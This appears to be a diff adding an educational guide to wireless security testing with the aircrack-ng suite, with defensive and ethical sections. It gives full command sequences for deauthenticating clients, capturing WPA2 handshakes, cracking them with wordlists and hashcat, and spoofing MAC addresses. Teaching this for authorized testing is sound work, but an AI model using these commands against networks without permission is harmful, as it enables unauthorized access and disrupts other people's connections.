@@ -1,0 +1,179 @@
+🛠️ Aircrack-ng Suite - Wireless Assessment Tools
+📦 Installation (Kali Linux)
+bash
+# Install aircrack-ng suite
+sudo apt update
+sudo apt install aircrack-ng -y
+
+# Verify installation
+aircrack-ng --version
+🎯 Core Tools in the Suite
+Tool	Purpose	Command
+airmon-ng	Enable monitor mode	airmon-ng start wlan0
+airodump-ng	Capture packets	airodump-ng wlan0mon
+aireplay-ng	Generate traffic	aireplay-ng --deauth
+aircrack-ng	Crack passwords	aircrack-ng capture.cap
+airbase-ng	Fake AP setup	airbase-ng -e "FakeAP" wlan0mon
+📊 WPA2 Handshake Process
+🤝 The 4-Way Handshake
+text
+Client                            Access Point
+   |                                    |
+   |<------- ANonce (AP Nonce) ---------|
+   |                                    |
+   |------ SNonce (Client Nonce) ------>|
+   |                                    |
+   |<---- GTK + MIC (Message Integrity) |
+   |                                    |
+   |----- ACK + MIC (Confirmation) ----->|
+   |                                    |
+🔍 What's Captured?
+PMK (Pairwise Master Key) - Derived from PSK
+
+ANonce & SNonce - Random numbers
+
+PTK (Pairwise Transient Key) - Session key
+
+MIC (Message Integrity Code) - Proof of key knowledge
+
+🎯 Ethical WPA2 Testing Methodology
+Phase 1: Reconnaissance
+bash
+# Put interface in monitor mode
+sudo airmon-ng start wlan0
+
+# Scan for networks
+sudo airodump-ng wlan0mon
+
+# Capture specific network
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
+  -w capture wlan0mon
+Phase 2: Handshake Capture
+bash
+# Deauthenticate client to force reconnection
+sudo aireplay-ng --deauth 10 \
+  -a AA:BB:CC:DD:EE:FF \
+  -c CLIENT:MAC:ADDR wlan0mon
+Phase 3: Password Cracking
+bash
+# Dictionary attack
+aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+  capture-01.cap
+
+# Using hashcat (GPU accelerated)
+aircrack-ng -J capture_hash capture-01.cap
+hashcat -m 2500 capture_hash.hccapx rockyou.txt
+📝 Wordlist Management
+Common Wordlists:
+bash
+/usr/share/wordlists/rockyou.txt.gz
+/usr/share/wordlists/fasttrack.txt
+/usr/share/seclists/Passwords/Common-Credentials/
+Create Custom Wordlist:
+bash
+# Crunch - Generate wordlists
+crunch 8 12 -t @@@%%%%%% -o custom.txt
+
+# Cewl - Scrape website for words
+cewl https://target.com -d 2 -w words.txt
+🛡️ Defending Against WPA2 Attacks
+Network Hardening:
+bash
+# 1. Use WPA3 when available
+# 2. Implement 802.1X/EAP
+# 3. Use strong passwords (>12 chars)
+# 4. Enable MAC filtering (limited protection)
+# 5. Regular security audits
+Detection of Attacks:
+bash
+# Monitor for deauth floods
+sudo tcpdump -i wlan0 -n \
+  "type mgt subtype deauth"
+🧪 Lab Environment Setup
+Safe Testing Lab:
+bash
+# Create isolated test network
+# Use Virtual AP with Hostapd
+sudo hostapd /etc/hostapd/hostapd.conf
+
+# Set up test client
+sudo iwconfig wlan0 essid "TEST-NET"
+Recommended Tools:
+Kali Linux - Pre-installed wireless tools
+
+Alfa AWUS036ACH - High-power wireless adapter
+
+Wifite - Automated testing framework
+
+Bettercap - Real-time monitoring
+
+
+🔍 Troubleshooting Common Issues
+Monitor Mode Won't Enable:
+bash
+# Check for interfering processes
+sudo airmon-ng check kill
+
+# Try different drivers
+sudo modprobe -r ath9k
+sudo modprobe ath9k
+
+# Use macchanger if needed
+sudo macchanger -r wlan0
+No Handshake Captured:
+bash
+# Increase deauth packets
+aireplay-ng --deauth 20 -a BSSID wlan0mon
+
+# Try different channels
+airodump-ng --channel 1,6,11 wlan0mon
+
+# Check distance to target
+# Move closer to access point
+Performance Optimization:
+bash
+# Use GPU with hashcat
+hashcat -m 2500 -D 1,2 capture.hccapx wordlist.txt
+
+# Optimize wordlist
+john --wordlist=rockyou.txt --rules --stdout > optimized.txt
+
+# Use mask attacks for patterns
+hashcat -m 2500 capture.hccapx -a 3 ?l?l?l?l?l?l
+
+
+🔒 Security Best Practices
+For Network Owners:
+Use WPA3 when available
+
+Strong passwords (>16 characters, mixed)
+
+Disable WPS (Wi-Fi Protected Setup)
+
+Regular updates of router firmware
+
+Monitor logs for suspicious activity
+
+For Ethical Hackers:
+Always get written permission
+
+Document everything
+
+Test in isolated environments first
+
+Respect privacy and data protection
+
+Follow responsible disclosure
+
+⚠️ Final Warning
+This guide is for EDUCATIONAL PURPOSES ONLY.
+Unauthorized access to computer networks is:
+
+Illegal under Swedish and international law
+
+Unethical and violates academic integrity
+
+Punishable by fines and imprisonment
+
+Use these skills to PROTECT networks, not attack them.
+
